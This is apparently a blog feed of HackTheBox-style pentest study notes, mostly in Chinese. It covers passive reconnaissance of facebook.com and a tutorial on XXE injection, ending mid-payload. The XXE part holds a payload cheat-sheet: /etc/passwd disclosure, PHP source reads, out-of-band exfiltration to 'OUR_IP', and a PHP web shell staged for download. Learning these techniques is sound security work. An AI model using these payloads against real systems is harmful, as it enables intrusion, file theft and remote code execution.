id="Querying-PTR-Records-for-an-IP-Address"><a href="#Querying-PTR-Records-for-an-IP-Address" class="headerlink" title="Querying: PTR Records for an IP Address"></a>Querying: PTR Records for an IP Address</h4><pre><code class="shell-session">Tanin@htb[/htb]$ nslookup -query=PTR 31.13.92.36Server:1.1.1.1Address:1.1.1.1#53Non-authoritative answer:36.92.13.31.in-addr.arpaname = edge-star-mini-shv-01-frt3.facebook.com.Authoritative answers can be found from:</code></pre><pre><code class="shell-session">Tanin@htb[/htb]$ dig -x 31.13.92.36 @1.1.1.1; &lt;&lt;&gt;&gt; DiG 9.16.1-Ubuntu &lt;&lt;&gt;&gt; -x 31.13.92.36 @1.1.1.1;; global options: +cmd;; Got answer:;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 51730;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1;; OPT PSEUDOSECTION:; EDNS: version: 0, flags:; udp: 1232;; QUESTION SECTION:;36.92.13.31.in-addr.arpa.      IN      PTR;; ANSWER SECTION:36.92.13.31.in-addr.arpa. 1028  IN      PTR     edge-star-mini-shv-01-frt3.facebook.com.;; Query time: 16 msec;; SERVER: 1.1.1.1#53(1.1.1.1);; WHEN: Mo Okt 18 16:14:20 CEST 2021;; MSG SIZE  rcvd: 106</code></pre><h4 id="Querying-ANY-Existing-Records"><a href="#Querying-ANY-Existing-Records" class="headerlink" title="Querying: ANY Existing Records"></a>Querying: ANY Existing Records</h4><pre><code class="shell-session">Tanin@htb[/htb]$ export TARGET=&quot;google.com&quot;Tanin@htb[/htb]$ nslookup -query=ANY $TARGETServer:10.100.0.1Address:10.100.0.1#53Non-authoritative answer:Name:google.comAddress: 172.217.16.142Name:google.comAddress: 2a00:1450:4001:808::200egoogle.comtext = &quot;docusign=05958488-4752-4ef2-95eb-aa7ba8a3bd0e&quot;google.comtext = &quot;docusign=1b0a6754-49b1-4db5-8540-d2c12664b289&quot;google.comtext = &quot;v=spf1 include:_spf.google.com ~all&quot;google.comtext = &quot;MS=E4A68B9AB2BB9670BCE15412F62916164C0B20BB&quot;google.comtext = &quot;globalsign-smime-dv=CDYX+XFHUw2wml6/Gb8+59BsH31KzUr6c1l2BPvqKX8=&quot;google.comtext = &quot;apple-domain-verification=30afIBcvSuDV2PLX&quot;google.comtext = &quot;google-site-verification=wD8N7i1JTNTkezJ49swvWW48f8_9xveREV4oB-0Hf5o&quot;google.comtext = &quot;facebook-domain-verification=22rm551cu4k0ab0bxsw536tlds4h95&quot;google.comtext = &quot;google-site-verification=TV9-DBe4R80X4v0M4U_bd_J9cpOJM0nikft0jAgjmsQ&quot;google.comnameserver = ns3.google.com.google.comnameserver = ns2.google.com.google.comnameserver = ns1.google.com.google.comnameserver = ns4.google.com.google.commail exchanger = 10 aspmx.l.google.com.google.commail exchanger = 40 alt3.aspmx.l.google.com.google.commail exchanger = 20 alt1.aspmx.l.google.com.google.commail exchanger = 30 alt2.aspmx.l.google.com.google.commail exchanger = 50 alt4.aspmx.l.google.com.google.com    origin = ns1.google.com    mail addr = dns-admin.google.com    serial = 398195569    refresh = 900    retry = 900    expire = 1800    minimum = 60google.comrdata_257 = 0 issue &quot;pki.goog&quot;Authoritative answers can be found from:</code></pre><h4 id="Querying-TXT-Records"><a href="#Querying-TXT-Records" class="headerlink" title="Querying: TXT Records"></a>Querying: TXT Records</h4><pre><code class="shell-session">Tanin@htb[/htb]$ export TARGET=&quot;facebook.com&quot;Tanin@htb[/htb]$ nslookup -query=TXT $TARGETServer:1.1.1.1Address:1.1.1.1#53Non-authoritative answer:facebook.comtext = &quot;v=spf1 redirect=_spf.facebook.com&quot;facebook.comtext = &quot;google-site-verification=A2WZWCNQHrGV_TWwKh6KHY90tY0SHZo_RnyMJoDaG0s&quot;facebook.comtext = &quot;google-site-verification=wdH5DTJTc9AYNwVunSVFeK0hYDGUIEOGb-RReU6pJlY&quot;Authoritative answers can be found from:</code></pre><pre><code class="shell-session">Tanin@htb[/htb]$ dig txt facebook.com @1.1.1.1; &lt;&lt;&gt;&gt; DiG 9.16.1-Ubuntu &lt;&lt;&gt;&gt; txt facebook.com @1.1.1.1;; global options: +cmd;; Got answer:;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 63771;; flags: qr rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 1;; OPT PSEUDOSECTION:; EDNS: version: 0, flags:; udp: 1232;; QUESTION SECTION:;facebook.com.                  IN      TXT;; ANSWER SECTION:facebook.com.           86400   IN      TXT     &quot;v=spf1 redirect=_spf.facebook.com&quot;facebook.com.           7200    IN      TXT     &quot;google-site-verification=A2WZWCNQHrGV_TWwKh6KHY90tY0SHZo_RnyMJoDaG0s&quot;facebook.com.           7200    IN      TXT     &quot;google-site-verification=wdH5DTJTc9AYNwVunSVFeK0hYDGUIEOGb-RReU6pJlY&quot;;; Query time: 24 msec;; SERVER: 1.1.1.1#53(1.1.1.1);; WHEN: Mo Okt 18 16:17:46 CEST 2021;; MSG SIZE  rcvd: 249</code></pre><h4 id="Querying-MX-Records"><a href="#Querying-MX-Records" class="headerlink" title="Querying: MX Records"></a>Querying: MX Records</h4><pre><code class="shell-session">Tanin@htb[/htb]$ export TARGET=&quot;facebook.com&quot;Tanin@htb[/htb]$ nslookup -query=MX $TARGETServer:1.1.1.1Address:1.1.1.1#53Non-authoritative answer:facebook.commail exchanger = 10 smtpin.vvv.facebook.com.Authoritative answers can be found from:</code></pre><pre><code class="shell-session">Tanin@htb[/htb]$ dig mx facebook.com @1.1.1.1; &lt;&lt;&gt;&gt; DiG 9.16.1-Ubuntu &lt;&lt;&gt;&gt; mx facebook.com @1.1.1.1;; global options: +cmd;; Got answer:;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 9392;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1;; OPT PSEUDOSECTION:; EDNS: version: 0, flags:; udp: 1232;; QUESTION SECTION:;facebook.com.                  IN      MX;; ANSWER SECTION:facebook.com.           3600    IN      MX      10 smtpin.vvv.facebook.com.;; Query time: 40 msec;; SERVER: 1.1.1.1#53(1.1.1.1);; WHEN: Mo Okt 18 16:18:22 CEST 2021;; MSG SIZE  rcvd: 68</code></pre><h1 id="Passive-Subdomain-Enumeration"><a href="#Passive-Subdomain-Enumeration" class="headerlink" title="Passive Subdomain Enumeration"></a>Passive Subdomain Enumeration</h1><h2 id="VirusTotal"><a href="#VirusTotal" class="headerlink" title="VirusTotal"></a>VirusTotal</h2><p>VirusTotal维护其DNS复制服务，该服务是通过保留用户访问其提供的URL时所做的DNS解析来开发的。要接收有关域的信息，请在搜索栏中键入域名，然后单击“关系”选项卡。</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309181654870.png" alt="image"></p><h2 id="Certificates"><a href="#Certificates" class="headerlink" title="Certificates"></a>Certificates</h2><p>我们可以用来提取子域的另一个有趣的信息来源是SSL&#x2F;TLS证书。主要原因是证书透明度（CT），该项目要求证书颁发机构（CA）颁发的每个SSL&#x2F;TLS证书都发布在可公开访问的日志中。 我们将学习如何使用两种主要资源检查CT日志，以发现目标组织的其他域名和子域： </p><p><a href="https://censys.io/">https://censys.io</a> </p><p><a href="https://crt.sh/">https://crt.sh</a> </p><p>我们可以导航到<a href="https://search.censys.io/certificates%E6%88%96https://crt.sh%E5%B9%B6%E4%BB%8B%E7%BB%8D%E6%88%91%E4%BB%AC%E7%9B%AE%E6%A0%87%E7%BB%84%E7%BB%87%E7%9A%84%E5%9F%9F%E5%90%8D%EF%BC%8C%E5%BC%80%E5%A7%8B%E5%8F%91%E7%8E%B0%E6%96%B0%E7%9A%84%E5%AD%90%E5%9F%9F%E3%80%82">https://search.censys.io/certificates或https://crt.sh并介绍我们目标组织的域名，开始发现新的子域。</a></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309181659020.png" alt="image"></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309181659612.png" alt="img"></p><p>尽管该网站非常优秀，但我们希望将这些信息组织起来，并能够将其与整个信息收集过程中发现的其他来源相结合。让我们向目标网站执行一个curl请求，请求JSON输出，因为这对我们来说更易于处理。我们可以通过以下命令执行此操作：</p><pre><code class="shell-session">Tanin@htb[/htb]$ export TARGET=&quot;facebook.com&quot;Tanin@htb[/htb]$ curl -s &quot;https://crt.sh/?q=$&#123;TARGET&#125;&amp;output=json&quot; | jq -r &#39;.[] | &quot;\(.name_value)\n\(.common_name)&quot;&#39; | sort -u &gt; &quot;$&#123;TARGET&#125;_crt.sh.txt&quot;</code></pre><pre><code class="shell-session">Tanin@htb[/htb]$ head -n20 facebook.com_crt.sh.txt*.adtools.facebook.com*.ak.facebook.com*.ak.fbcdn.net*.alpha.facebook.com*.assistant.facebook.com*.beta.facebook.com*.channel.facebook.com*.cinyour.facebook.com*.cinyourrc.facebook.com*.connect.facebook.com*.cstools.facebook.com*.ctscan.facebook.com*.dev.facebook.com*.dns.facebook.com*.extern.facebook.com*.extools.facebook.com*.f--facebook.com*.facebook.com*.facebookcorewwwi.onion*.facebookmail.com</code></pre><table><thead><tr><th><code>curl -s</code></th><th>Issue the request with minimal output.</th></tr></thead><tbody><tr><td><code>https://crt.sh/?q=&lt;DOMAIN&gt;&amp;output=json</code></td><td>Ask for the json output.</td></tr><tr><td><code>jq -r &#39;.[]&#39; &quot;\(.name_value)\n\(.common_name)&quot;&#39;</code></td><td>Process the json output and print certificate’s name value and common name one per line.</td></tr><tr><td><code>sort -u</code></td><td>Sort alphabetically the output provided and removes duplicates.</td></tr></tbody></table><p>我们还可以通过以下方式使用OpenSSL对目标手动执行此操作：</p><pre><code class="shell-session">Tanin@htb[/htb]$ export TARGET=&quot;facebook.com&quot;Tanin@htb[/htb]$ export PORT=&quot;443&quot;Tanin@htb[/htb]$ openssl s_client -ign_eof 2&gt;/dev/null &lt;&lt;&lt;$&#39;HEAD / HTTP/1.0\r\n\r&#39; -connect &quot;$&#123;TARGET&#125;:$&#123;PORT&#125;&quot; | openssl x509 -noout -text -in - | grep &#39;DNS&#39; | sed -e &#39;s|DNS:|\n|g&#39; -e &#39;s|^\*.*||g&#39; | tr -d &#39;,&#39; | sort -u*.facebook.com*.facebook.net*.fbcdn.net*.fbsbx.com*.m.facebook.com*.messenger.com*.xx.fbcdn.net*.xy.fbcdn.net*.xz.fbcdn.netfacebook.commessenger.com</code></pre><h2 id="Automating-Passive-Subdomain-Enumeration"><a href="#Automating-Passive-Subdomain-Enumeration" class="headerlink" title="Automating Passive Subdomain Enumeration"></a>Automating Passive Subdomain Enumeration</h2><p>我们已经学会了如何使用第三方服务从目标组织获取有用的信息，如子域、命名模式、备用TLD、IP范围等，而无需直接与其基础设施交互或依赖自动化工具。现在，我们将学习如何使用工具和以前获得的信息枚举子域。</p><h4 id="TheHarvester"><a href="#TheHarvester" class="headerlink" title="TheHarvester"></a>TheHarvester</h4><p><a href="https://github.com/laramies/theHarvester">TheHarvester</a> </p><p>Harvester是一个简单易用但功能强大且有效的工具，用于早期渗透测试和红队参与。我们可以使用它来收集信息，以帮助识别公司的攻击面。该工具从各种公共数据源收集电子邮件、名称、子域、IP地址和URL，用于被动信息收集。目前，我们将使用以下模块：</p><p>为了实现自动化，我们将创建一个名为sources.txt的文件，其中包含以下内容。</p><pre><code class="shell-session">Tanin@htb[/htb]$ cat sources.txtbaidubufferoveruncrtshhackertargetotxprojecdiscoveryrapiddnssublist3rthreatcrowdtrellourlscanvhostvirustotalzoomeye</code></pre><p>创建文件后，我们将执行以下命令从这些来源收集信息。</p><pre><code class="shell-session">Tanin@htb[/htb]$ export TARGET=&quot;facebook.com&quot;Tanin@htb[/htb]$ cat sources.txt | while read source; do theHarvester -d &quot;$&#123;TARGET&#125;&quot; -b $source -f &quot;$&#123;source&#125;_$&#123;TARGET&#125;&quot;;done&lt;SNIP&gt;********************************************************************  _   _                                            _             ** | |_| |__   ___    /\  /\__ _ _ ____   _____  ___| |_ ___ _ __  ** | __|  _ \ / _ \  / /_/ / _` | &#39;__\ \ / / _ \/ __| __/ _ \ &#39;__| ** | |_| | | |  __/ / __  / (_| | |   \ V /  __/\__ \ ||  __/ |    **  \__|_| |_|\___| \/ /_/ \__,_|_|    \_/ \___||___/\__\___|_|    **                                                                 ** theHarvester 4.0.0                                              ** Coded by Christian Martorella                                   ** Edge-Security Research                                          ** cmartorella@edge-security.com                                   **                                                                 ********************************************************************[*] Target: facebook.com[*] Searching Urlscan.[*] ASNS found: 29--------------------AS12578AS13335AS13535AS136023AS14061AS14618AS15169AS15817&lt;SNIP&gt;</code></pre><p>过程结束后，我们可以提取找到的所有子域，并通过以下命令对其进行排序：</p><pre><code class="shell-session">Tanin@htb[/htb]$ cat *.json | jq -r &#39;.hosts[]&#39; 2&gt;/dev/null | cut -d&#39;:&#39; -f 1 | sort -u &gt; &quot;$&#123;TARGET&#125;_theHarvester.txt&quot;</code></pre><p>现在我们可以通过以下方式合并所有被动侦察文件：</p><pre><code class="shell-session">Tanin@htb[/htb]$ cat facebook.com_*.txt | sort -u &gt; facebook.com_subdomains_passive.txtTanin@htb[/htb]$ cat facebook.com_subdomains_passive.txt | wc -l11947</code></pre><h1 id="Passive-Infrastructure-Identification"><a href="#Passive-Infrastructure-Identification" class="headerlink" title="Passive Infrastructure Identification"></a>Passive Infrastructure Identification</h1><p><a href="https://www.netcraft.com/">Netcraft</a>甚至可以在不与服务器交互的情况下向我们提供有关服务器的信息，从被动信息收集的角度来看，这是有价值的。我们可以通过访问使用该服务<a href="https://sitereport.netcraft.com并进入目标域./">https://sitereport.netcraft.com并进入目标域。</a></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309181743827.png" alt="img"></p><p>我们需要特别注意使用的最新IP。有时，我们可以在网络服务器被放置在负载均衡器、网络应用程序防火墙或IDS后面之前，从中发现实际的IP地址，从而允许我们在配置允许的情况下直接连接到它。这种技术可能会干扰或改变我们未来的测试活动。</p><h2 id="Wayback-Machine"><a href="#Wayback-Machine" class="headerlink" title="Wayback Machine"></a>Wayback Machine</h2><p>我们可以使用 <a href="http://web.archive.org/">Wayback Machine</a> 访问这些网站的几个版本，以查找在源代码或文件中可能有有趣注释的旧版本，而这些注释不应该存在。此工具可用于在某个时间点查找网站的旧版本。以一个运行WordPress的网站为例。在使用手动方法和自动化工具评估它时，我们可能找不到任何有趣的东西，所以我们使用Wayback Machine搜索它，并找到一个使用特定（现在很脆弱）插件的版本。回到网站的当前版本，我们发现插件没有被正确删除，仍然可以通过wp内容目录访问。然后我们可以利用它在主机上获得远程代码执行和丰厚的奖励。</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309181746630.png" alt="image"></p><p>我们还可以使用工具waybackurls来检查Wayback Machine保存的URL，并查找特定的关键字。如果我们在主机上正确设置了Go，我们可以按如下方式安装该工具：</p><p> <a href="https://github.com/tomnomnom/waybackurls">waybackurls</a></p><pre><code class="shell-session">Tanin@htb[/htb]$ go install github.com/tomnomnom/waybackurls@latest</code></pre><p>要从域中获取带有获取日期的已爬网URL列表，我们可以在命令中添加-dates开关，如下所示：</p><pre><code class="shell-session">Tanin@htb[/htb]$ waybackurls -dates https://facebook.com &gt; waybackurls.txtTanin@htb[/htb]$ cat waybackurls.txt2018-05-20T09:46:07Z http://www.facebook.com./2018-05-20T10:07:12Z https://www.facebook.com/2018-05-20T10:18:51Z http://www.facebook.com/#!/pages/Welcome-Baby/143392015698061?ref=tsrobots.txt2018-05-20T10:19:19Z http://www.facebook.com/2018-05-20T16:00:13Z http://facebook.com2018-05-21T22:12:55Z https://www.facebook.com2018-05-22T15:14:09Z http://www.facebook.com2018-05-22T17:34:48Z http://www.facebook.com/#!/Syerah?v=info&amp;ref=profile/robots.txt2018-05-23T11:03:47Z http://www.facebook.com/#!/Bin595</code></pre><p>如果我们想访问特定的资源，我们需要将URL放在搜索菜单中，并导航到创建快照的日期。如前所述，Wayback Machine是一种方便的工具，不应被忽视。它很可能导致我们发现被遗忘的资产、页面等，从而发现缺陷。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Information-Gathering&quot;&gt;&lt;a href=&quot;#Information-Gathering&quot; class=&quot;headerlink&quot; title=&quot;Information Gathering&quot;&gt;&lt;/a&gt;Information Gathering&lt;/h1&gt;&lt;p&gt;信息收集阶段是每次渗透测试的第一步，我们需要在没有目标组织内部信息的情况下模拟外部攻击者。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309181613272.png&quot; alt=&quot;img&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="base" scheme="https://taninluv.github.io/tags/base/"/>
    
  </entry>
  
  <entry>
    <title>web attacks-XXE</title>
    <link href="https://taninluv.github.io/2023/09/11/web-attacks-XXE/"/>
    <id>https://taninluv.github.io/2023/09/11/web-attacks-XXE/</id>
    <published>2023-09-11T07:00:57.000Z</published>
    <updated>2023-09-12T13:27:28.461Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Intro-to-XXE"><a href="#Intro-to-XXE" class="headerlink" title="Intro to XXE"></a>Intro to XXE</h1><p>XML外部实体（XXE）注入漏洞发生在从用户控制的输入中获取XML数据时，而没有对其进行适当的清理或安全解析，这可能使我们能够使用XML功能执行恶意操作。XXE漏洞会对web应用程序及其后端服务器造成相当大的损害，从泄露敏感文件到关闭后端服务器，这就是为什么它被OWASP认为是十大web安全风险之一。</p><span id="more"></span><p>XML文档的一些关键元素，如：</p><table><thead><tr><th>Key</th><th>Definition</th><th>Example</th></tr></thead><tbody><tr><td><code>Tag</code></td><td>The keys of an XML document, usually wrapped with (<code>&lt;</code>&#x2F;<code>&gt;</code>) characters.</td><td><code>&lt;date&gt;</code></td></tr><tr><td><code>Entity</code></td><td>XML variables, usually wrapped with (<code>&amp;</code>&#x2F;<code>;</code>) characters.</td><td><code>&lt;</code></td></tr><tr><td><code>Element</code></td><td>The root element or any of its child elements, and its value is stored in between a start-tag and an end-tag.</td><td><code>&lt;date&gt;01-01-2022&lt;/date&gt;</code></td></tr><tr><td><code>Attribute</code></td><td>Optional specifications for any element that are stored in the tags, which may be used by the XML parser.</td><td><code>version=&quot;1.0&quot;</code>&#x2F;<code>encoding=&quot;UTF-8&quot;</code></td></tr><tr><td><code>Declaration</code></td><td>Usually the first line of an XML document, and defines the XML version and encoding to use when parsing it.</td><td><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</code></td></tr></tbody></table><p>此外，一些字符被用作XML文档结构的一部分，如&lt;、&gt;、&amp;或“。因此，如果我们需要在XML文档中使用它们，我们应该将它们替换为相应的实体引用（例如&amp;lt；、&amp;gt；、&amp;amp；、&amp;quot；）。最后，我们可以在&lt;！–和–&gt;之间的XML文档中编写注释，类似于HTML文档。</p><h1 id="备忘录"><a href="#备忘录" class="headerlink" title="备忘录"></a>备忘录</h1><h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><table><thead><tr><th><strong>Code</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><code>&lt;!ENTITY xxe SYSTEM &quot;http://localhost/email.dtd&quot;&gt;</code></td><td>Define External Entity to a URL</td></tr><tr><td><code>&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</code></td><td>Define External Entity to a file path</td></tr><tr><td><code>&lt;!ENTITY company SYSTEM &quot;php://filter/convert.base64-encode/resource=index.php&quot;&gt;</code></td><td>Read PHP source code with base64 encode filter</td></tr><tr><td><code>&lt;!ENTITY % error &quot;&lt;!ENTITY content SYSTEM &#39;%nonExistingEntity;/%file;&#39;&gt;&quot;&gt;</code></td><td>Reading a file through a PHP error</td></tr><tr><td><code>&lt;!ENTITY % oob &quot;&lt;!ENTITY content SYSTEM &#39;http://OUR_IP:8000/?content=%file;&#39;&gt;&quot;&gt;</code></td><td>Reading a file OOB exfiltration</td></tr></tbody></table><h2 id="XML-DTD"><a href="#XML-DTD" class="headerlink" title="XML DTD"></a>XML DTD</h2><p>XML文档类型定义（DTD）允许根据预定义的文档结构验证XML文档。预定义的文档结构可以在文档本身或外部文件中定义。下面是我们前面看到的XML文档的DTD示例：</p><pre><code class="xml">&lt;!DOCTYPE email [  &lt;!ELEMENT email (date, time, sender, recipients, body)&gt;  &lt;!ELEMENT recipients (to, cc?)&gt;  &lt;!ELEMENT cc (to*)&gt;  &lt;!ELEMENT date (#PCDATA)&gt;  &lt;!ELEMENT time (#PCDATA)&gt;  &lt;!ELEMENT sender (#PCDATA)&gt;  &lt;!ELEMENT to  (#PCDATA)&gt;  &lt;!ELEMENT body (#PCDATA)&gt;]&gt;</code></pre><p>正如我们所看到的，DTD使用element类型声明来声明根电子邮件元素，然后表示其子元素。之后，每个子元素也被声明，其中一些子元素也具有子元素，而其他子元素可能仅包含原始数据（如PCDATA所示）。 上面的DTD可以放在XML文档本身中，就在第一行的XML声明之后。否则，它可以存储在一个外部文件（例如email.dtd）中，然后在XML文档中使用SYSTEM关键字引用，如下所示：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE email SYSTEM &quot;email.dtd&quot;&gt;</code></pre><p>也可以通过URL引用DTD，如下所示：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE email SYSTEM &quot;http://inlanefreight.com/email.dtd&quot;&gt;</code></pre><p>这与HTML文档定义和引用JavaScript和CSS脚本的方式相对类似。</p><h2 id="XML-Entities"><a href="#XML-Entities" class="headerlink" title="XML Entities"></a>XML Entities</h2><p>我们还可以在XML DTD中定义自定义实体（即XML变量），以允许重构变量并减少重复数据。这可以通过使用ENTITY关键字来完成，该关键字后面跟着实体名称及其值，如下所示：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE email [  &lt;!ENTITY company &quot;Inlane Freight&quot;&gt;]&gt;</code></pre><p>一旦我们定义了一个实体，它就可以在XML文档中用&amp;和分号引用；（例如&amp;company；）。每当引用实体时，XML解析器都会将其替换为其值。然而，最有趣的是，我们可以使用SYSTEM关键字引用外部XML实体，该关键字后面跟着外部实体的路径，如下所示：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE email [  &lt;!ENTITY company SYSTEM &quot;http://localhost/company.txt&quot;&gt;  &lt;!ENTITY signature SYSTEM &quot;file:///var/www/html/signature.txt&quot;&gt;]&gt;</code></pre><p>注意：我们也可以使用PUBLIC关键字而不是SYSTEM来加载外部资源，后者用于公开声明的实体和标准，例如语言代码（lang&#x3D;“en”）。</p><p>这与文档中定义的内部XML实体类似。当我们引用外部实体（例如&amp;signature；）时，解析器会用存储在外部文件中的值（例如signature.txt）替换该实体。当在服务器端解析XML文件时，在SOAP（XML）API或web表单等情况下，实体可以引用存储在后端服务器上的文件，当我们引用该实体时，最终可能会向我们披露该文件。</p><h1 id="Local-File-Disclosure"><a href="#Local-File-Disclosure" class="headerlink" title="Local File Disclosure"></a>Local File Disclosure</h1><p>当web应用程序信任来自用户输入的未过滤的XML数据时，我们可能能够引用外部XMLDTD文档并定义新的自定义XML实体。假设我们可以定义新的实体并将它们显示在网页上。在这种情况下，我们还应该能够定义外部实体，并使它们引用本地文件，当显示本地文件时，该文件应该在后端服务器上向我们显示该文件的内容。 让我们看看如何识别潜在的XXE漏洞，并利用它们从后端服务器读取敏感文件。</p><h2 id="Identifying"><a href="#Identifying" class="headerlink" title="Identifying"></a>Identifying</h2><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309121003069.jpeg" alt="xxe_request" style="zoom:150%;" /><p>正如我们所看到的，该表单似乎正在以XML格式将我们的数据发送到web服务器，使其成为潜在的XXE测试目标。假设web应用程序使用过时的XML库，并且它没有对XML输入应用任何过滤器或净化。在这种情况下，我们可能能够利用这种XML表单来读取本地文件。 </p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309121004984.jpeg" alt="xxe_response"></p><p>我们看到电子邮件元素的值正在页面上显示给我们。要将外部文件的内容打印到页面上，我们应该注意显示了哪些元素，这样我们就知道要注入哪些元素。在某些情况下，可能不会显示任何元素，我们将在接下来的部分中介绍如何利用这些元素。 目前，我们知道，无论我们在<email></email>元素中放置什么值，都会显示在HTTP响应中。因此，让我们尝试定义一个新的实体，然后将其用作电子邮件元素中的变量，看看它是否被我们定义的值所取代。为此，我们可以使用上一节中学到的内容来定义新的XML实体，并在XML输入的第一行之后添加以下行：</p><pre><code class="xml">&lt;!DOCTYPE email [  &lt;!ENTITY company &quot;Inlane Freight&quot;&gt;]&gt;</code></pre><blockquote><p>注意：在我们的示例中，HTTP请求中的XML输入没有在XML数据本身中声明DTD，也没有在外部引用DTD，所以我们在定义实体之前添加了一个新的DTD。如果DOCTYPE已经在XML请求中声明，我们只需要向其中添加ENTITY元素。</p></blockquote><p>现在，我们应该有一个名为company的新XML实体，我们可以使用&amp;company；来引用它；。因此，与其在电子邮件元素中使用我们的电子邮件，不如让我们尝试使用&amp;company；，看看它是否会被我们定义的值（Inlane Freight）所取代：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309121008563.jpeg" alt="new_entity"></p><p>正如我们所看到的，响应确实使用了我们定义的实体（Inlane Freight）的值，而不是显示&amp;company；，表明我们可以注入XML代码。相比之下，非易受攻击的web应用程序会将（&amp;company；）显示为原始值。这证实了我们正在处理一个易受XXE攻击的web应用程序。</p><blockquote><p>注意：有些web应用程序在HTTP请求中可能默认为JSON格式，但仍可能接受其他格式，包括XML。因此，即使web应用程序以JSON格式发送请求，我们也可以尝试将Content-Type标头更改为application&#x2F;xml，然后使用在线工具将JSON数据转换为xml。如果web应用程序确实接受了带有XML数据的请求，那么我们也可以针对XXE漏洞对其进行测试，这可能会揭示一个意想不到的XXE漏洞。</p></blockquote><h2 id="Reading-Sensitive-Files"><a href="#Reading-Sensitive-Files" class="headerlink" title="Reading Sensitive Files"></a>Reading Sensitive Files</h2><p>现在我们可以定义新的内部XML实体了，让我们看看是否可以定义外部XML实体。这样做与我们之前所做的非常相似，但我们只需添加SYSTEM关键字并在其后面定义外部引用路径，正如我们在上一节中所学到的：</p><pre><code class="xml">&lt;!DOCTYPE email [  &lt;!ENTITY company SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;</code></pre><blockquote><p>提示：在某些Java web应用程序中，我们还可以指定一个目录而不是文件，并且我们将获得一个目录列表，这对于定位敏感文件非常有用。</p></blockquote><h2 id="Reading-Source-Code"><a href="#Reading-Source-Code" class="headerlink" title="Reading Source Code"></a>Reading Source Code</h2><p>本地文件公开的另一个好处是能够获得web应用程序的源代码。这将使我们能够执行白盒渗透测试，以揭示web应用程序中的更多漏洞，或者至少揭示数据库密码或API密钥等秘密配置。 因此，让我们看看是否可以使用相同的攻击来读取index.php文件的源代码，如下所示：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309121012371.jpeg" alt="file_php"></p><p>正如我们所看到的，这并没有奏效，因为我们没有得到任何内容。之所以发生这种情况，是因为我们引用的文件不是正确的XML格式，因此无法将其作为外部XML实体进行引用。&#x3D;&#x3D;如果一个文件包含一些XML的特殊字符（例如&lt;&#x2F;&gt;&#x2F;&amp;），它将破坏外部实体引用，并且不用于引用。&#x3D;&#x3D;此外，我们不能读取任何二进制数据，因为它也不符合XML格式。 幸运的是，PHP提供了包装过滤器，允许我们对某些资源（包括文件）进行base64编码，在这种情况下，最终的base64输出不应破坏XML格式。为此，我们将使用PHP的php:&#x2F;&#x2F;filter&#x2F;包装。有了这个过滤器，我们可以指定convert.base64-encode编码器作为我们的过滤器，然后添加一个输入资源（例如resource&#x3D;index.php），如下所示：</p><h2 id="Remote-Code-Execution-with-XXE"><a href="#Remote-Code-Execution-with-XXE" class="headerlink" title="Remote Code Execution with XXE"></a>Remote Code Execution with XXE</h2><p>除了读取本地文件外，我们还可以通过远程服务器执行代码。最简单的方法是通过调用我们的服务器来寻找ssh密钥，或者尝试在基于Windows的web应用程序中使用哈希窃取技巧。如果这些都不起作用，我们仍然&#x3D;&#x3D;可以通过PHP:&#x2F;&#x2F;expect过滤器在基于PHP的web应用程序上执行命令&#x3D;&#x3D;，尽管这需要安装并启用PHP expect模块。 如果XXE直接打印其输出“如本节所示”，那么我们可以执行如下基本命令expect:&#x2F;&#x2F;id，并且页面应该打印命令输出。但是，如果我们无法访问输出，或者需要执行更复杂的命令“例如reverse shell”，则XML语法可能会中断，该命令可能无法执行。 将XXE转换为RCE的最有效方法是从服务器中获取一个web外壳并将其写入web应用程序，然后我们可以与它交互以执行命令。为此，我们可以先编写一个基本的PHP web shell，然后启动一个python web服务器，如下所示：</p><pre><code class="shell-session">Tanin@htb[/htb]$ echo &#39;&lt;?php system($_REQUEST[&quot;cmd&quot;]);?&gt;&#39; &gt; shell.phpTanin@htb[/htb]$ sudo python3 -m http.server 80</code></pre><p>现在，我们可以使用以下XML代码来执行一个curl命令，该命令将我们的web shell下载到远程服务器：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE email [  &lt;!ENTITY company SYSTEM 